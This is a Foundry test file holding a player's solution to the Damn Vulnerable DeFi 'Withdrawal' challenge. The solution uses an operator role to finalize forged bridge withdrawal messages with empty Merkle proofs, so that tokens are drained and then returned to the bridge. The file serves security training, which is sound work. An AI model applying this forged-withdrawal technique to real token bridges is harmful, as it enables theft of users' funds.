// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {L1Gateway} from "../../src/withdrawal/L1Gateway.sol";
import {L1Forwarder} from "../../src/withdrawal/L1Forwarder.sol";
import {L2MessageStore} from "../../src/withdrawal/L2MessageStore.sol";
import {L2Handler} from "../../src/withdrawal/L2Handler.sol";
import {TokenBridge} from "../../src/withdrawal/TokenBridge.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract WithdrawalChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    // Mock addresses of the bridge's L2 components
    address l2MessageStore = makeAddr("l2MessageStore");
    address l2TokenBridge = makeAddr("l2TokenBridge");
    address l2Handler = makeAddr("l2Handler");

    uint256 constant START_TIMESTAMP = 1718786915;
    uint256 constant INITIAL_BRIDGE_TOKEN_AMOUNT = 1_000_000e18;
    uint256 constant WITHDRAWALS_AMOUNT = 4;
    bytes32 constant WITHDRAWALS_ROOT = 0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e;

    TokenBridge l1TokenBridge;
    DamnValuableToken token;
    L1Forwarder l1Forwarder;
    L1Gateway l1Gateway;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Start at some realistic timestamp
        vm.warp(START_TIMESTAMP);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy and setup infra for message passing
        l1Gateway = new L1Gateway();
        l1Forwarder = new L1Forwarder(l1Gateway);
        l1Forwarder.setL2Handler(address(l2Handler));

        // Deploy token bridge on L1
        l1TokenBridge = new TokenBridge(token, l1Forwarder, l2TokenBridge);

        // Set bridge's token balance, manually updating the `totalDeposits` value (at slot 0)
        token.transfer(address(l1TokenBridge), INITIAL_BRIDGE_TOKEN_AMOUNT);
        vm.store(address(l1TokenBridge), 0, bytes32(INITIAL_BRIDGE_TOKEN_AMOUNT));

        // Set withdrawals root in L1 gateway
        l1Gateway.setRoot(WITHDRAWALS_ROOT);

        // Grant player the operator role
        l1Gateway.grantRoles(player, l1Gateway.OPERATOR_ROLE());

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(l1Forwarder.owner(), deployer);
        assertEq(address(l1Forwarder.gateway()), address(l1Gateway));

        assertEq(l1Gateway.owner(), deployer);
        assertEq(l1Gateway.rolesOf(player), l1Gateway.OPERATOR_ROLE());
        assertEq(l1Gateway.DELAY(), 7 days);
        assertEq(l1Gateway.root(), WITHDRAWALS_ROOT);

        assertEq(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertEq(l1TokenBridge.totalDeposits(), INITIAL_BRIDGE_TOKEN_AMOUNT);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
     
     //function forwardMessage(uint256 nonce, address l2Sender, address target, bytes memory message)
    function getCallDataForwarder(uint256 nonce, address l2Sender, address target, bytes memory message) public returns (bytes memory) {

        bytes memory msg = abi.encodeWithSelector(l1Forwarder.forwardMessage.selector, nonce,l2Sender,target,message);
        //bytes memory msg = abi.encodeWithSignature("forwardMessage(uint256, address, address, bytes)", nonce, l2Sender,target,message);
        return msg;
    } 

    //function executeTokenWithdrawal(address receiver, uint256 amount) external
    function getCallDataExecuteTokenWithdrawal(address receiver, uint256 amount) public returns (bytes memory) {
        bytes memory msg = abi.encodeWithSelector(l1TokenBridge.executeTokenWithdrawal.selector, receiver, amount);
        //bytes memory msg = abi.encodeWithSignature("executeTokenWithdrawal(address, uint256)", receiver, amount);
        return msg;
    }

    function test_withdrawal() public checkSolvedByPlayer {
        console.log('[+] gateway :',address(l1Gateway));
        console.log('[+] forwarder :',address(l1Forwarder));
        console.log('[+] bridge :',address(l1TokenBridge));

        vm.warp(1718786915 + 700 days); // 700일후로 이동

        //first Event
        bytes memory firstWithdrawMsg = getCallDataExecuteTokenWithdrawal(address(0x328809Bc894f92807417D2dAD6b7C998c1aFdac6), 10000000000000000000);
        bytes memory firstEvent = getCallDataForwarder(0, 0x328809Bc894f92807417D2dAD6b7C998c1aFdac6, address(l1TokenBridge), firstWithdrawMsg);
        l1Gateway.finalizeWithdrawal(0, address(0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16), address(l1Forwarder), 1718786915, firstEvent, new bytes32[](1));
        //console.logBytes(firstEvent);

        //second Event
        bytes memory secondWithdrawMsg = getCallDataExecuteTokenWithdrawal(address(0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e), 10000000000000000000);
        bytes memory secondEvent = getCallDataForwarder(1, 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e, address(l1TokenBridge), secondWithdrawMsg);
        l1Gateway.finalizeWithdrawal(1, address(0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16), address(l1Forwarder), 1718786965, secondEvent, new bytes32[](1));

        //fourth Event 
        bytes memory fourthWithdrawMsg = getCallDataExecuteTokenWithdrawal(address(0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b), 10000000000000000000);
        bytes memory fourthEvent = getCallDataForwarder(3, 0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b, address(l1TokenBridge), fourthWithdrawMsg);
        l1Gateway.finalizeWithdrawal(3, address(0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16), address(l1Forwarder), 1718787127, fourthEvent, new bytes32[](1));

        //fourth Event 
        bytes memory playerWithdrawMsg = getCallDataExecuteTokenWithdrawal(player, 999000000000000000000000);
        bytes memory playerEvent = getCallDataForwarder(5, player, address(l1TokenBridge), playerWithdrawMsg);
        l1Gateway.finalizeWithdrawal(3, address(0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16), address(l1Forwarder), 1718787127, playerEvent, new bytes32[](1));

        //third Event (Supicious)
        bytes memory thirdWithdrawMsg = getCallDataExecuteTokenWithdrawal(address(0xea475d60c118d7058beF4bDd9c32bA51139a74e0), 999000000000000000000000);
        bytes memory thirdEvent = getCallDataForwarder(2, 0xea475d60c118d7058beF4bDd9c32bA51139a74e0, address(l1TokenBridge), thirdWithdrawMsg);
        l1Gateway.finalizeWithdrawal(2, address(0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16), address(l1Forwarder), 1718787050, thirdEvent, new bytes32[](1));

        
        // 모든 이벤트 실행 후, player가 받아온 DVT 토큰 브릿지로 반납
        token.transfer(address(l1TokenBridge), token.balanceOf(address(player)));

        
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Token bridge still holds most tokens
        assertLt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertGt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT * 99e18 / 100e18);

        // Player doesn't have tokens
        assertEq(token.balanceOf(player), 0);

        // All withdrawals in the given set (including the suspicious one) must have been marked as processed and finalized in the L1 gateway
        assertGe(l1Gateway.counter(), WITHDRAWALS_AMOUNT, "Not enough finalized withdrawals");
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"),
            "First withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"),
            "Second withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"),
            "Third withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"),
            "Fourth withdrawal not finalized"
        );
    }
}
